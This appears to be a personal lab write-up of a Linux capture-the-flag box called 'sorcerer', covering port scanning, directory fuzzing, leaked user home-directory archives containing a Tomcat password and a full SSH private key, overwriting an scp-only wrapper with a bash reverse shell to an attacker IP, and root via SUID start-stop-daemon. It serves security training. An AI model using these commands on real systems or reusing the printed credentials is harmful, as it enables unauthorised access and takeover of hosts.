

## Lab Details
- Difficulty: Intermediate 
- OS: Linux
- Foothold time: 1 hour
- Privesc time: 5 minutes
- Total solve time: 1 hour and 5 minutes 

## Summary
- Initial access: RCE via SCP wrapper 
- Privilege escalation: SUID on `start-stop-daemon`

## Enumeration
- Key findings: Found application named `sorcerer` on port 7742
##### Steps
- run `nmap`
```
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      40470/udp   mountd
|   100005  1,2,3      44355/tcp   mountd
|   100021  1,3,4      43301/tcp   nlockmgr
|   100021  1,3,4      51802/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs      3-4 (RPC #100003)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-title: Apache Tomcat/7.0.4
|_http-favicon: Apache Tomcat
37299/tcp open  mountd   1-3 (RPC #100005)
43301/tcp open  nlockmgr 1-4 (RPC #100021)
44355/tcp open  mountd   1-3 (RPC #100005)
45643/tcp open  mountd   1-3 (RPC #100005)
```
## Foothold
- Path: RCE via SCP wrapper 
- Key commands: `scp`
##### Steps
- run `ffuf` against the endpoint on port `7742`
```
$ ffuf -u http://192.168.67.100:7742/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.67.100:7742/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

default                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1ms]
zipfiles                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1ms]
:: Progress: [62281/62281] :: Job [1/1] :: 16666 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```
- discovered the `zipfiles` endpoint which contains a list of zipped files
![[Pasted image 20260401235733.png]]
- download and analyze the zipped files appears to be home directory for users on the file system
![[Pasted image 20260401235859.png]]
- identified `tomcat` login in user `max` directory 
```
$ cat tomcat-users.xml.bak
<SNIP>
  <role rolename="manager-gui"/>
  <user username="tomcat" password="VTUD2XxJjf5LPmu6" roles="manager-gui"/>
</tomcat-users>                                                                    <SNIP>                                     
```
- identified `.ssh` directory in user `max` directory
![[Pasted image 20260402000428.png]]
- the `.ssh` directory contains user `max`'s private `ssh` key 
```
??(kali?kali)-[~/Downloads/home/max/.ssh]
??$ ls     
authorized_keys  id_rsa  id_rsa.pub
                                                                                                          
???(kali?kali)-[~/Downloads/home/max/.ssh]
??$ cat id_rsa              
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```
- unable to `ssh` directly as max 
- enumerate through other artifacts in the max directory and found a `scp` wrapper file
- the script check if scp command is used with ssh key if so then the scp command works however ssh command alone will be blocked
```
$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac   
```
- check `authrized_keys` file and found the script location
```
$ cat authorized_keys 
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC39t1AvYVZKohnLz6x92nX2cuwMyuKs0qUMW9Pa+zpZk2hb/ZsULBKQgFuITVtahJispqfRY+kqF8RK6Tr0vDcCP4jbCjadJ3mfY+G5rsLbGfek3vb9drJkJ0+lBm8/OEhThwWFjkdas2oBJF8xSg4dxS6jC8wsn7lB+L3xSS7A84RnhXXQGGhjGNfG6epPB83yTV5awDQZfupYCAR/f5jrxzI26jM44KsNqb01pyJlFl+KgOs1pCvXviZi0RgCfKeYq56Qo6Z0z29QvCuQ16wr0x42ICTUuR+Tkv8jexROrLzc+AEk+cBbb/WE/bVbSKsrK3xB9Bl9V9uRJT/faMENIypZceiiEBGwAcT5lW551wqctwi2HwIuv12yyLswYv7uSvRQ1KU/j0K4weZOqDOg1U4+klGi1is3HsFKrUZsQUu3Lg5tHkXWthgtlROda2Q33jX3WsV8P3Z4+idriTMvJnt2NwCDEoxpi/HX/2p0G5Pdga1+gXeXFc88+DZyGVg4yW1cdSR/+jTKmnluC8BGk+hokfGbX3fq9BIeiFebGnIy+py1e4k8qtWTLuGjbhIkPS3PJrhgSzw2o6IXombpeWCMnAXPgZ/x/49OKpkHogQUAoSNwgfdhgmzLz06MVgT+ap0To7VsTvBJYdQiv9kmVXtQQoUCAX0b84fazWQQ== max@sorcerer  
```
- prepare the attack by generate a malicious `scp_wrapper.sh` 
```
$ cat scp_wrapper.sh
/bin/bash -i >& /dev/tcp/192.168.45.238/80 0>&1
```
- abuse the `scp` wrapper file by copying the malicious `scp` wrapper from attack to the location where the original copy is stored which is `/home/max/scp_wrapper.sh`
```
$ scp -i id_rsa -O ./scp_wrapper.sh max@192.168.108.100:/home/max/scp_wrapper.sh
The authenticity of host '192.168.108.100 (192.168.108.100)' can't be established.
ED25519 key fingerprint is: SHA256:VS30806A83YR6y/jbQ1fv89VM1FjmXYbb9zmKkJ5N+4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.108.100' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
scp_wrapper.sh                                                                                                                                                                  100%   48     0.2KB/s   00:00
```
- ssh as max to trigger the reverse shell
```
$ ssh max@192.168.108.100 -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
PTY allocation request failed on channel 0
```
- obtain a reverse shell as max
```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.238] from (UNKNOWN) [192.168.108.100] 41446
bash: cannot set terminal process group (945): Inappropriate ioctl for device
bash: no job control in this shell
max@sorcerer:~$ id
id
uid=1003(max) gid=1003(max) groups=1003(max)
```
## Lateral Movement 
- Path:
- Key commands:
##### Steps

## Privilege Escalation
- Path: SUID privilege escalation 
- Key commands: `/usr/sbin/start-stop-daemon`
##### Steps
- load and run `linpeas.sh`
- search in `gtfo.bin` and found POC https://gtfobins.org/gtfobins/start-stop-daemon/
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strings Not Found
strace Not Found
-rwsr-xr-x 1 root root 113K Jun 24  2020 /usr/sbin/mount.nfs
-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon
```
- run the POC and obtain root access
```
max@sorcerer:~$ /usr/sbin/start-stop-daemon -S -x /bin/sh -- -p
# id
uid=1003(max) gid=1003(max) euid=0(root) groups=1003(max)
```
## Lessons Learned
- Attack family:
- Key takeaway:
##### Steps

## Resources
- References: